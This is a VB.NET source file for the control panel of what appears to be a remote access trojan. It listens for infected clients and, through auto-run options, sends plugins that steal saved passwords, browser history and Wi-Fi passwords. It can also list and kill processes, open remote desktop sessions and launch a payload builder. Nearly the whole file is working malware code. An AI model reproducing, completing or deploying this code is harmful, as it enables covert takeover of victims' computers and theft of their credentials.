Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Text
Imports System.Threading
Imports PacketLib.Packet

Public Class Form1
    Private LIST_OF_SERVERS As New List(Of TcpListener)
    Public Shared L As New List(Of Clients)

    Public Settings As New Settings_Form
    Public Setting_T As Thread

    Public Builder As New Builder_Form
    Public Builder_T As Thread

    Public TestBytes As Byte() = Encoding.Default.GetBytes("")
    Public Sub CheckClient(ByVal k As Clients)

        While True

            Thread.Sleep(2000)

            Try
                k.C.GetStream.WriteAsync(TestBytes, 0, TestBytes.Length)

            Catch ex As Exception

                For Each Cli As Clients In L

                    If Cli.C.Client.RemoteEndPoint.ToString = k.C.Client.RemoteEndPoint.ToString Then

                        Try

                            For Each h As ListViewItem In AeroListView1.Items

                                If h.Text = Cli.C.Client.RemoteEndPoint.ToString Then

                                    AeroListView1.Items.Remove(h)

                                End If

                            Next
                        Catch exS As Exception

                        End Try


                        L.Remove(k)

                        Exit Sub

                    End If
                Next

            End Try

        End While
    End Sub
    Public Sub Automation_Tasks(ByVal C As Clients)
        Thread.Sleep(100)

        If Settings.Pass_CHK.Checked = True Then
            '
            Dim P As New PacketMaker
            P.Type_Packet = PacketType.PLUGIN
            P.Plugin = Plugins._PW

            Task.Run(Sub() Helpers.Sender(C, P))

            Thread.Sleep(100)
        End If

        If Settings.Hist_CHK.Checked = True Then
            Dim P As New PacketMaker
            P.Type_Packet = PacketType.PLUGIN
            P.Plugin = Plugins._WB

            Task.Run(Sub() Helpers.Sender(C, P))
            Thread.Sleep(100)
        End If

        If Settings.WF_CHK.Checked = True Then
            Dim P As New PacketMaker
            P.Type_Packet = PacketType.PLUGIN
            P.Plugin = Plugins._W_PW

            Task.Run(Sub() Helpers.Sender(C, P))

        End If

    End Sub
    Public Sub Start()

        If Settings.Button1.Text = "Listen !" Then

            L = New List(Of Clients)

            LIST_OF_SERVERS = New List(Of TcpListener)

            For Each I As ListViewItem In Settings.AeroListView1.Items

                Dim S As New TcpListener(IPAddress.Any, I.Text)

                S.Start()

                LIST_OF_SERVERS.Add(S)

                Task.Factory.StartNew(Sub() D(S, I.Text), CancellationToken.None, TaskCreationOptions.LongRunning)

            Next

            Settings.Button1.Text = "Started !"

        Else

            For Each tcpListener As TcpListener In LIST_OF_SERVERS
                tcpListener.Stop()
            Next

            LIST_OF_SERVERS.Clear()

            L.Clear()

            AeroListView1.Items.Clear()

            Settings.Button1.Text = "Listen !"

        End If

    End Sub

    Public Sub D(ByVal T As TcpListener, ByVal port As Integer)

        While True

            Dim Y As New Clients

            Y.C = T.AcceptTcpClient

            Y.ID = Y.C.Client.RemoteEndPoint.ToString

            Y.Local_Port = port

            L.Add(Y)

            Dim B As BinaryFormatter = New BinaryFormatter()

            Dim p As PacketMaker = New PacketMaker()

            p.Type_Packet = PacketType.ID

            Task.Run(Sub() CheckClient(Y))


            Task.Run(Sub() R(Y, Y.C.GetStream, port))

            Task.Run(Sub() Helpers.Sender(Y, p))


            Dim auto_tasks As New Thread(Sub() Automation_Tasks(Y))
            auto_tasks.Start()

        End While
    End Sub

    Public Sub R(ByVal C As Clients, ByVal L As NetworkStream, ByVal Port As String)


        While True

            Dim sf As BinaryFormatter = New BinaryFormatter()

            Dim packet As PacketMaker = CType(sf.Deserialize(L), PacketMaker)

            Try


                Select Case packet.Type_Packet

                    Case PacketType.ID

                        Task.Run(Sub() Countries.GetFlags(C.C.Client.RemoteEndPoint.ToString, ImageList1, AeroListView1, packet.Misc, Port))

                    Case PacketType.PW

                        Dim T As New Thread(Sub() C.SetPW(packet.Misc))
                        T.Start()

                    Case PacketType.HIST


                        Dim T As New Thread(Sub() C.SetHist(packet.Misc))
                        T.Start()

                    Case PacketType.W_PW

                        Dim T As New Thread(Sub() C.SetW_PW(packet.Misc))
                        T.Start()

                    Case PacketType.TASKS

                        Dim Subject As Packet_Subject = CType(packet.Misc(0), Packet_Subject)

                        Select Case Subject

                            Case Packet_Subject.RETRIEVE_TASKS

                                Dim T As New Thread(Sub() C.Set_Tasks(packet.Misc(1)))
                                T.Start()

                            Case Packet_Subject.KILL_TASK

                                Dim T As New Thread(Sub() C.Set_Delete_Proc(packet.Misc))
                                T.Start()

                        End Select

                    Case PacketType.RD

                        ThreadPool.QueueUserWorkItem(Sub() C.SetRD(packet.Misc))

                End Select

            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try

        End While

    End Sub




    Private Sub SettingsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SettingsToolStripMenuItem.Click
        Helpers.Form_Checker(Settings, Setting_T)
    End Sub

    Private Sub Custom_Button1_Click(sender As Object, e As EventArgs) Handles Close_BTN.Click
        Dim currentProcess As Process = Process.GetCurrentProcess()
        NativeAPI.NtTerminateProcess(currentProcess.Handle, 0)
    End Sub

    Private Sub LoginToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LoginToolStripMenuItem.Click
        If (Me.AeroListView1.SelectedItems.Count = 1) Then

            For Each H As Clients In L

                If (Me.AeroListView1.SelectedItems(0).Text = H.C.Client.RemoteEndPoint.ToString) Then
                    If (H.Main_Form IsNot Nothing) Then

                        H.Main_Form.Text = H.ID

                        H.Main_Form.Label1.Text = H.ID

                        H.Main_Form.PictureBox1.Image = AeroListView1.SelectedItems(0).ImageList.Images(AeroListView1.SelectedItems(0).Index)

                        Dim B As New Bitmap(H.Main_Form.PictureBox1.Image)
                        H.Main_Form.Icon = Icon.FromHandle(B.GetHicon)

                        Dim thread As Thread = New Thread(Sub() Application.Run(H.Main_Form))

                        thread.Start()

                    Else

                        H.Main_Form = New Client_Form()

                        H.Main_Form.Text = H.ID

                        H.Main_Form.Label1.Text = H.ID

                        H.Main_Form.PictureBox1.Image = AeroListView1.SelectedItems(0).ImageList.Images(AeroListView1.SelectedItems(0).Index)

                        Dim B As New Bitmap(H.Main_Form.PictureBox1.Image)
                        H.Main_Form.Icon = Icon.FromHandle(B.GetHicon)

                        Dim thread2 As Thread = New Thread(Sub() Application.Run(H.Main_Form))
                        thread2.Start()

                    End If

                    Exit For
                End If
            Next
        End If
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If IO.File.Exists("Settings.ini") Then

            Dim P As String() = Split(IO.File.ReadAllText("Settings.ini"), ",")

            If P(0) = "1" Then
                Settings.Pass_CHK.Checked = True
            End If

            If P(1) = "1" Then
                Settings.Hist_CHK.Checked = True
            End If

            If P(2) = "1" Then
                Settings.WF_CHK.Checked = True
            End If

        End If

    End Sub

    Private Sub BuilderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BuilderToolStripMenuItem.Click
        Helpers.Form_Checker(Builder, Builder_T)
    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click

        For Each C As Clients In L

            If C.ID = AeroListView1.SelectedItems(0).Text Then

                Dim p As PacketMaker = New PacketMaker()

                p.Type_Packet = PacketType.MSG

                Task.Run(Sub() Helpers.Sender(C, p))

            End If

        Next

    End Sub

    Private Sub RDToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RDToolStripMenuItem.Click
        If (Me.AeroListView1.SelectedItems.Count = 1) Then
            Try
                For Each H As Clients In L

                    If AeroListView1.SelectedItems(0).Text = H.C.Client.RemoteEndPoint.ToString Then

                        If Not H.Viewer Is Nothing Then
                            H.Viewer.Text = H.C.Client.RemoteEndPoint.ToString
                            H.Viewer.Label1.Text = H.C.Client.RemoteEndPoint.ToString

                            Dim O As Thread = New Thread(Sub()
                                                             Application.Run(H.Viewer)
                                                         End Sub)
                            O.Start()

                        Else
                            H.Viewer = New RD_Form
                            H.Viewer.Text = H.C.Client.RemoteEndPoint.ToString()
                            Dim O2 As Thread = New Thread(Sub()
                                                              Application.Run(H.Viewer)
                                                          End Sub)
                            O2.Start()

                        End If
                        Exit For
                    End If



                Next
            Catch ex As Exception

            End Try
        End If
    End Sub
End Class
